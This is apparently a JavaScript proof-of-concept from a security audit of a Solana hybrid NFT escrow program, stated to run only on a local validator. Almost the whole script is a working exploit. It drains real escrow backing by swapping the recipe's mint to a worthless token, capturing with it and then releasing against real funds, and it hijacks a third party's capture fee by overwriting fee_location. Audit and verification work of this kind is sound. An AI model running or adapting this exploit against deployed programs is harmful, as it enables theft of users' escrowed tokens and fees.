// Auditor B cross-check of A-02 (runs only against a LOCAL validator; throwaway keys; no real funds).
// Extends A's PoC 12: (1) completes the loop A describes but did not execute -- after capturing with a
// worthless mint and restoring the real mint, RELEASE the NFT against REAL backing; (2) shows the
// fee_location overwrite redirects a *third party's* capture fee to the attacker (relevant to the
// 2026-09-25 "fee to one fixed address" design).
const L=require('./lib.js'); const {getAccount,TransactionInstruction}=L;
const NoReroll=1;
async function bal(a){try{return (await getAccount(L.conn,a)).amount;}catch(e){return 0n;}}
async function ownerOf(pk){const ai=await L.conn.getAccountInfo(pk);return new L.PublicKey(ai.data.slice(1,33));}
(async()=>{
  const auth=L.Keypair.generate(); await L.airdrop(auth.publicKey,500); const R=1_000_000; const FEE=20_000; // 2% of R
  const real=await L.createMint(L.conn,auth,auth.publicKey,null,0);
  const junk=await L.createMint(L.conn,auth,auth.publicKey,null,0);
  const col=await L.createCollection(auth,auth,'M','u'); const escrow=await L.initEscrowV2(auth);
  const honestFee=L.Keypair.generate().publicKey;   // the "fixed" disclosed fee address
  const recipe=await L.initRecipeV1(auth,col.publicKey,real,honestFee,{name:'N',uri:'u',max:3,min:0,amount:R,feeCapture:FEE,path:NoReroll});
  const a1=await L.createAsset(auth,col,auth,escrow,'Rare','u');
  const a2=await L.createAsset(auth,col,auth,escrow,'Common','u');
  const eReal=(await L.getOrCreateAssociatedTokenAccount(L.conn,auth,real,escrow,true)).address;
  await L.mintTo(L.conn,auth,real,eReal,auth,R); // one honest holder's backing already in escrow (models a prior capture)
  // --- Part 1: full drain loop for A-02 ---
  await L.updateRecipeV1(auth,col.publicKey,junk,auth.publicKey,{});      // token -> junk, fee_location -> attacker
  const jUser=(await L.getOrCreateAssociatedTokenAccount(L.conn,auth,junk,auth.publicKey)).address;
  await L.mintTo(L.conn,auth,junk,jUser,auth,R+FEE);
  const jEsc=(await L.getOrCreateAssociatedTokenAccount(L.conn,auth,junk,escrow,true)).address;
  await L.send([new TransactionInstruction({programId:L.MPL_HYBRID,keys:L.captureKeys(auth,auth.publicKey,recipe,escrow,a1.publicKey,col.publicKey,jUser,jEsc,junk,jUser,auth.publicKey),data:L.disc('capture_v2')})],[auth]);
  await L.updateRecipeV1(auth,col.publicKey,real,auth.publicKey,{});      // back to real mint, fee_location STILL attacker
  const rUser=(await L.getOrCreateAssociatedTokenAccount(L.conn,auth,real,auth.publicKey)).address;
  const before=await bal(eReal), atkBefore=await bal(rUser);
  await L.send([new TransactionInstruction({programId:L.MPL_HYBRID,keys:L.captureKeys(auth,auth.publicKey,recipe,escrow,a1.publicKey,col.publicKey,rUser,eReal,real,rUser,auth.publicKey),data:L.disc('release_v2')})],[auth]);
  const after=await bal(eReal), atkAfter=await bal(rUser);
  console.log(`P1 real escrow backing ${before} -> ${after}; attacker real tokens ${atkBefore} -> ${atkAfter} (paid only junk)`);
  const p1 = after===0n && atkAfter-atkBefore===BigInt(R);
  // --- Part 2: fee_location hijack against a third-party user ---
  const user=L.Keypair.generate(); await L.airdrop(user.publicKey,10);
  const uAta=(await L.getOrCreateAssociatedTokenAccount(L.conn,auth,real,user.publicKey)).address;
  await L.mintTo(L.conn,auth,real,uAta,auth,R+FEE);
  const atkFeeAta=rUser; const honestAta=(await L.getOrCreateAssociatedTokenAccount(L.conn,auth,real,honestFee)).address;
  const f0=await bal(atkFeeAta), h0=await bal(honestAta);
  await L.send([new TransactionInstruction({programId:L.MPL_HYBRID,keys:L.captureKeys(user,user.publicKey,recipe,escrow,a2.publicKey,col.publicKey,uAta,eReal,real,atkFeeAta,auth.publicKey),data:L.disc('capture_v2')})],[user]);
  const f1=await bal(atkFeeAta), h1=await bal(honestAta);
  console.log(`P2 user capture fee: attacker fee ATA +${f1-f0}, disclosed fee address +${h1-h0}; NFT owner=${(await ownerOf(a2.publicKey)).equals(user.publicKey)?'user':'?'}`);
  const p2 = f1-f0===BigInt(FEE) && h1===h0;
  console.log(p1&&p2?'B13 EXECUTED: PASS (A-02 full drain loop + fee-destination hijack confirmed)':'B13: see numbers'); process.exit(p1&&p2?0:1);
})().catch(e=>{console.error('B13 ERROR',e.message,e.logs||'');process.exit(1);});
